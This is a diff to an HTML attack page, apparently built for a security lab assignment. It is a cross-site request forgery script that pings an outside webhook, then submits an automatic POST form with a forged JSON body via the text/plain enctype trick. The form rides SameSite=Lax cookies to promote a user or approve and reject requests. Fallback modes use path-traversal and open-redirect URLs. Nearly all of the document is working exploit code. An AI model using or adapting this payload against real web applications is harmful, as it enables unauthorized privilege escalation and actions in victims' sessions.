@@ -3,23 +3,46 @@
 <head><meta charset="utf-8"></head>
 <body>
 <script>
-// v9: adds t=extnav (navigation-capability probe).
+// v10: adds auto-submitting TOP-LEVEL POST forms (text/plain -> JSON-ish body).
+// Lax+POST: Chrome sends SameSite=Lax cookies on top-level cross-site POSTs
+// within ~2 minutes of cookie creation (fresh bot session qualifies).
+//   t=formpromote  POST api/users/joseph/promote      (the win)
+//   t=formapprove  POST api/requests/<r>/approve      (alternate win)
+//   t=formreject   POST api/requests/<r>/reject       (VISIBLE oracle: #r flips)
 var W    = 'https://swift-stream-09.webhook.cool';
 var BASE = 'https://10.20.18.55:2070/labs/assignment03/environment/1/';
 var q    = new URLSearchParams(location.search);
 var mode = q.get('t') || 'reject';
 var rid  = q.get('r') || '7';
-var target;
+var tag  = mode + '-' + rid;
 
-if      (mode === 'promote') { target = BASE + '?view=admin&request=../users/joseph/promote?/seen'; }
-else if (mode === 'aget')    { target = BASE + '?view=admin&approve=' + rid; }
-else if (mode === 'pjoseph') { target = BASE + '?view=admin&promote=joseph'; }
-else if (mode === 'next')    { target = 'https://10.20.18.55:2070/login?next=https%3A%2F%2Fswift-stream-09.webhook.cool%2Foss'; }
-else if (mode === 'extnav')  { target = W + '/extnav'; }
-else /* reject oracle */     { target = BASE + '?view=admin&request=../requests/' + encodeURIComponent(rid) + '/reject?/seen'; }
+try { fetch(W + '/c1?tag=' + encodeURIComponent(tag) + '&t=' + Date.now(), { keepalive: true, mode: 'no-cors' }); } catch (e) {}
 
-try { fetch(W + '/c1?tag=' + encodeURIComponent(mode + '-' + rid) + '&t=' + Date.now(), { keepalive: true, mode: 'no-cors' }); } catch (e) {}
-location.href = target;
+if (mode === 'formpromote' || mode === 'formapprove' || mode === 'formreject') {
+  var action;
+  if      (mode === 'formpromote') action = BASE + 'api/users/joseph/promote';
+  else if (mode === 'formapprove') action = BASE + 'api/requests/' + rid + '/approve';
+  else                             action = BASE + 'api/requests/' + rid + '/reject';
+  var f = document.createElement('form');
+  f.method = 'POST';
+  f.enctype = 'text/plain';
+  f.action = action;
+  var i = document.createElement('input');
+  i.name = '{"a":"b","x":"';   // body becomes {"a":"b","x":"=}  — valid JSON
+  i.value = '"}';
+  f.appendChild(i);
+  document.body.appendChild(f);
+  f.submit();
+} else {
+  var target;
+  if      (mode === 'promote') { target = BASE + '?view=admin&request=../users/joseph/promote?/seen'; }
+  else if (mode === 'aget')    { target = BASE + '?view=admin&approve=' + rid; }
+  else if (mode === 'pjoseph') { target = BASE + '?view=admin&promote=joseph'; }
+  else if (mode === 'next')    { target = 'https://10.20.18.55:2070/login?next=https%3A%2F%2Fswift-stream-09.webhook.cool%2Foss'; }
+  else if (mode === 'extnav')  { target = W + '/extnav'; }
+  else /* reject oracle */     { target = BASE + '?view=admin&request=../requests/' + encodeURIComponent(rid) + '/reject?/seen'; }
+  location.href = target;
+}
 </script>
 </body>
 </html>
